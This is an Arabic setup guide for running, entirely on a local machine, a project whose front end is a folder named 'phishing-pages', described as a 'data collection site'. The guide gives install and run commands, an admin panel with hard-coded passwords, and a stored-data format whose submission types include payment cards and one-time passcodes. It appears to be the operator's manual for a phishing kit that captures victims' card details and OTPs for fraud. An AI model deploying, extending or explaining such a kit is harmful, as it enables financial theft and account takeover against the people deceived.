# 🏠 تشغيل النظام كاملاً محلياً (بدون خدمات خارجية)

## ✅ البنية الحالية (محلية تماماً)

```
carenewservir1/
├── artifacts/
│   ├── api-server/          ← خادم API (Express)
│   │   └── src/
│   │       ├── app.ts
│   │       ├── index.ts
│   │       ├── routes/
│   │       └── lib/
│   │
│   └── phishing-pages/      ← الموقع الأمامي (React)
│       └── src/
│           └── lib/
│
├── lib/
│   └── db/                  ← قاعدة البيانات (JSON)
│       └── src/
│           ├── index.ts
│           └── db-store.json  ← ملف البيانات (محلي تماماً)
│
└── package.json             ← مدير المشروع
```

---

## 🔧 الخطوات للتشغيل المحلي (100%)

### الخطوة 1: التثبيت

```bash
# تثبيت جميع الحزم
pnpm install
```

### الخطوة 2: بدء الخادم

```bash
# الطريقة الأولى (من المشروع الرئيسي):
cd artifacts/api-server
pnpm run dev

# أو من المجلد الرئيسي:
pnpm run -C artifacts/api-server dev
```

**ستكون النتيجة:**
```
Server running on http://localhost:5000
```

### الخطوة 3: بدء الموقع الأمامي (في terminal جديد)

```bash
cd artifacts/phishing-pages
pnpm run dev

# أو من المجلد الرئيسي:
pnpm run -C artifacts/phishing-pages dev
```

**ستكون النتيجة:**
```
Local:   http://localhost:5173
```

---

## 📱 الوصول للتطبيق

| الصفحة | العنوان | الوصف |
|------|--------|-------|
| **الموقع الأساسي** | http://localhost:5173 | موقع جمع البيانات |
| **لوحة الإدارة** | http://localhost:5173/admin | عرض البيانات (محمي بكلمة مرور) |
| **الخادم** | http://localhost:5000/api | API endpoints |

---

## 💾 التخزين (محلي 100%)

### ملف البيانات:
```
lib/db/src/db-store.json
```

### محتوى الملف:
```json
{
  "submissions": [
    {
      "id": 1,
      "sessionId": "xxx-xxx-xxx",
      "type": "initial",
      "data": "{\"ownerName\":\"محمد\", ...}",
      "ipAddress": "127.0.0.1",
      "createdAt": "2026-05-19T..."
    },
    ...
  ],
  "nextId": 2
}
```

**البيانات محفوظة تلقائياً** كل مرة يدخل مستخدم بيانات!

---

## ✅ التحقق من أن كل شيء محلي

### 1. تحقق من عدم وجود DATABASE_URL

```bash
# تأكد أن متغير البيئة غير موجود:
echo $DATABASE_URL
# يجب أن تكون نتيجة فارغة
```

### 2. شاهد رسالة الخادم عند البدء

```
DATABASE_URL not set; using persistent disk fallback database
```

**هذا يعني أن كل شيء محلي!** ✅

### 3. تحقق من ملف البيانات

```bash
# افتح الملف
cat lib/db/src/db-store.json

# أو استخدم أي text editor
```

---

## 🔒 أمان الموقع

### كلمة المرور الافتراضية:

**Username:** `admin`  
**Password:** `Adm!n@2025#SecureKey9x`

أو:
**Backup Password:** `adminfayiz@@20`

**غيّرها عند الدخول لأول مرة!**

---

## 🧪 اختبار النظام

### الخطوة 1: أدخل بيانات من الموقع

```
1. افتح http://localhost:5173
2. أملأ النموذج
3. اضغط "إرسال"
```

### الخطوة 2: شاهد البيانات في الإدارة

```
1. افتح http://localhost:5173/admin
2. ادخل كلمة المرور
3. يجب أن تشوف البيانات الجديدة فوراً
```

### الخطوة 3: تحقق من ملف البيانات

```bash
# افتح الملف
cat lib/db/src/db-store.json

# يجب أن ترى البيانات محفوظة
```

---

## 📊 هيكل البيانات

```json
{
  "id": 1,                              // معرف فريد
  "sessionId": "uuid",                  // معرف الجلسة
  "type": "card|otp|initial|vehicle",  // نوع البيانات
  "data": "{...}",                      // البيانات JSON
  "ipAddress": "127.0.0.1",             // عنوان IP
  "userAgent": "Mozilla/5.0...",        // نوع المتصفح
  "createdAt": "2026-05-19T..."         // الوقت
}
```

---

## 🛠️ ملفات العملية

### الخادم (API):
- **تشغيل:** `artifacts/api-server/src/index.ts`
- **المسارات:** `artifacts/api-server/src/routes/`
- **المنطق:** `artifacts/api-server/src/lib/`

### قاعدة البيانات:
- **الملف:** `lib/db/src/db-store.json`
- **الكود:** `lib/db/src/index.ts`
- **الـ Schema:** `lib/db/src/schema/submissions.ts`

### الموقع الأمامي:
- **الصفحات:** `artifacts/phishing-pages/src/pages/`
- **API Client:** `artifacts/phishing-pages/src/lib/api.ts`
- **البيانات المحلية:** `artifacts/phishing-pages/src/lib/submissions.ts`

---

## ⚙️ إضافة متغيرات البيئة

إذا أردت تغيير Port أو إعدادات أخرى:

### للخادم (`artifacts/api-server/.env`):
```
PORT=5000
```

### للموقع (`artifacts/phishing-pages/.env.local`):
```
VITE_API_BASE_URL=http://localhost:5000/api
VITE_PORT=5173
```

---

## 🚀 أوامر مفيدة

### تشغيل كل شيء معاً:

```bash
# في 2 terminal منفصلة:

# Terminal 1: الخادم
cd artifacts/api-server
pnpm run dev

# Terminal 2: الموقع
cd artifacts/phishing-pages
pnpm run dev
```

### بناء الإصدار الإنتاجي:

```bash
# بناء كل شيء
pnpm run build

# تشغيل الإصدار
cd artifacts/api-server
pnpm run start
```

---

## 🔍 استكشاف الأخطاء

### المشكلة: الخادم لا يبدأ

```bash
# تحقق من البورت
lsof -i :5000

# أو جرب بورت مختلف:
PORT=5001 pnpm run dev
```

### المشكلة: الموقع لا يتصل بالخادم

```bash
# تحقق من أن الخادم يعمل:
curl http://localhost:5000/api/health

# إذا لم تجد رد، ابدأ الخادم أولاً
```

### المشكلة: البيانات لا تُحفظ

```bash
# تحقق من الملف:
ls -la lib/db/src/db-store.json

# تحقق من الصلاحيات:
chmod 644 lib/db/src/db-store.json
```

---

## 📝 ملاحظات مهمة

✅ **كل شيء محلي** - بدون خدمات خارجية  
✅ **البيانات محفوظة** في `db-store.json`  
✅ **بدون قاعدة بيانات خارجية** - JSON كافي  
✅ **بدون Vercel** أو أي cloud  
✅ **موثوق ودائم** - البيانات لا تضيع  

---

## ✨ الخلاصة

```
pnpm install          ← تثبيت واحد فقط
↓
cd artifacts/api-server && pnpm run dev     ← الخادم على 5000
↓
cd artifacts/phishing-pages && pnpm run dev ← الموقع على 5173
↓
http://localhost:5173                        ← ادخل للموقع
↓
البيانات تُحفظ في lib/db/src/db-store.json ← محلي 100%
```

**كل شيء هنا! 🎉**
